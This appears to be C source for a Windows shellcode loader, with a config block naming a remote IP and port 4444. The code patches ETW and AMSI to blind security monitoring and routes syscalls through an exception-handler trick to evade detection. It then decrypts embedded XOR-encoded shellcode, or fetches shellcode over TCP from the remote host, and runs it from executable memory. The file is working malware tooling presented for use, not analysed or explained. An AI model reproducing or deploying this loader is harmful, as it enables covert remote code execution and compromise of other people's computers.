// START CONFIG //

#define LOCAL_SHELLCODE
// #define LOCAL_DLL
#define DECRYPTION_KEY 0xAA

// #define ENABLE_HTTP
// #define HTTP_URL

// #define ENABLE_HTTPS
// #define HTTPS_URL

// #define ENABLE_TCP
#define TCP_IP "82.153.79.198"
#define TCP_PORT 4444

// END CONFIG //

#ifdef ENABLE_TCP
    #include <winsock2.h>
    #include <ws2tcpip.h>
#endif
#include <windows.h>
#include <unwin.h>
#include <stdint.h>

#include "debug/debug.h"
#include "syscalls/syscalls.h"
#include "evasion/evasion.h"
#ifdef LOCAL_SHELLCODE
    #include "shellcode/cargo.h"
#endif
#include "shellcode/shellcode.h"

static NTSTATUS status;

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
    INIT_VSE(SyscallRunnerVEH, GlobalVSE);
    if (ETWPatching()  != 0) return -1;
    if (AMSIPatching() != 0) return -1;

    size_t shellcodeLen;

    #if   defined(LOCAL_SHELLCODE)
        size_t shellcode_size = (size_t)(shellcode_end - shellcode_start);
        PBYTE shellcode = RollbackShellcode(shellcode_start, DECRYPTION_KEY, shellcode_size, &shellcodeLen);
    #elif defined(ENABLE_HTTP)
    #elif defined(ENABLE_HTTPS)
    #elif defined(ENABLE_TCP)
        WSADATA wsaData;
        int winsockResult;
        BYTE buf[1024];
        int cursor = 0;

        winsockResult = WSAStartup(MAKEWORD(2,2), &wsaData);

        if (winsockResult != 0) {
            DEBUG_INFO("ERROR on WSAStartup: %x", winsockResult);
            return -1;
        }

        struct sockaddr_in clientAddr;
        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (clientSocket == INVALID_SOCKET) {
            DEBUG_INFO("ERROR on socket: %x", clientSocket);
            return -1;
        }

        clientAddr.sin_family = AF_INET;
        clientAddr.sin_port   = htons(TCP_PORT);
        inet_pton(AF_INET, TCP_IP, &clientAddr.sin_addr);

        winsockResult = connect(clientSocket, (struct sockaddr*)&clientAddr, sizeof(clientAddr));

        if (winsockResult == SOCKET_ERROR) {
            DEBUG_INFO("ERROR on connect: %x", winsockResult);
            return -1;
        }

        int dataLen;
        PBYTE shellcode = malloc(1024);

        while (( dataLen = recv( clientSocket, shellcode + cursor, 1024, 0)) > 0) {
            cursor += dataLen;
            shellcode = realloc(shellcode, cursor + 1024);
        }

        winsockResult = shutdown(clientSocket, SD_SEND);
        closesocket(clientSocket);
        WSACleanup();

        shellcodeLen = cursor;
    #endif

    DEBUG_INFO("Shellcode size %d", shellcodeLen);

    SIZE_T regionSize = shellcodeLen;
    PVOID  regionPtr  = NULL;
    EXECUTE_VSE(GlobalVSE, "NtAllocateVirtualMemory", status,
        (HANDLE) NtCurrentProcess,
        (PVOID*) &regionPtr,
        0,
        (PSIZE_T) &regionSize,
        (ULONG) MEM_COMMIT | MEM_RESERVE,
        (ULONG) PAGE_EXECUTE_READWRITE
    );

    if ( !NT_SUCCESS(status) ) {
        DEBUG_INFO("ERROR on NtAllocateVirtualMemory: %x", status);
    }

    RtlMoveMemory(regionPtr, shellcode, shellcodeLen);
    free(shellcode);

    if ( !NT_SUCCESS(status) ) {
        DEBUG_INFO("ERROR on RtlMoveMemory: %x", status);
    }

    (*(void(*)())(regionPtr))();

    DEBUG_GETCHAR();

    return 0;
}
